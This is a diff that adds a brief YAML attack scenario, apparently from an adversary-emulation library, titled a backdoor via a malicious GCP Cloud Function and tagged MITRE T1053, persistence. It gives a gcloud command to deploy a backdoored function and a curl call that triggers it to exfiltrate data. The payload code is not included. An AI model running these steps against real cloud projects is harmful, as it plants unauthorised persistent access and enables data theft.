@@ -1,0 +1,10 @@
+name: Backdoor via Malicious GCP Cloud Function
+description: Deploys a cloud function that triggers exfiltration or persistent access.
+mitre_technique: T1053
+stage: Persistence
+steps:
+- action: gcloud functions deploy malicious-function --runtime python39 --trigger-http
+    --entry-point handler --source=./malicious-code
+  description: Deploy a backdoored Cloud Function
+- action: curl https://<region>-<project>.cloudfunctions.net/malicious-function
+  description: Trigger the function to exfiltrate data or perform other actions
